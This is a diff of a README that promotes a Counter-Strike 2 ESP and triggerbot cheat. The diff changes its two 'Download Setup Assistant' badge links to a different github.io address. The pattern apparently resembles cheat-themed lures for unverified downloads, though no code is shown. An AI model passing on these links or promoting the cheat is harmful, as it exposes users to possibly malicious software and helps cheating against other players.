@@ -1,7 +1,7 @@
 # 🧠 Counter-Strike 2 — ESP + Triggerbot Assistant Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://cs2-esp-triggerbot.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download_Now-green?style=for-the-badge&logo=github)](https://cs2-esp-triggerbot.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://foccohoedenwork.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download_Now-green?style=for-the-badge&logo=github)](https://foccohoedenwork.github.io/.github/)
 
 ---
 
